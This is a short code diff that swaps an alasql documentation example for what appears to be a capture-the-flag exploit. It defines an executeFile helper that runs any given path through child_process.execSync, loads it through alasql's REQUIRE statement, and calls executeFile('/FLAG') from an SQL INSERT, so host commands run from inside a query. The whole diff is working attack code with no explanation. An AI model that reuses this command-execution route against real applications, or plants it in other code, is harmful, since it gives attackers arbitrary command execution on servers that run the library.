@@ -1,10 +1,16 @@
-alasql("CREATE TABLE example2 (a INT, b INT)");
+function executeFile(filename) {
+  const { execSync } = require('child_process');
+  try {
+    return execSync(filename).toString();
+  } catch (error) {
+    return error.message;
+  }
+}
 
-// alasql's data store for a table can be assigned directly
-alasql.tables.example2.data = [
-    {a:1,b:2},
-    {a:3,b:4}
-];
+const alasql = require('alasql');
 
-// ... or manipulated with normal SQL
-alasql("INSERT INTO example2 VALUES (1,5)");
+alasql('REQUIRE "./execfile.js"');
+
+alasql('CREATE TABLE WOO (content TEXT)');
+
+alasql('INSERT INTO WOO VALUES (executeFile("/FLAG"))');
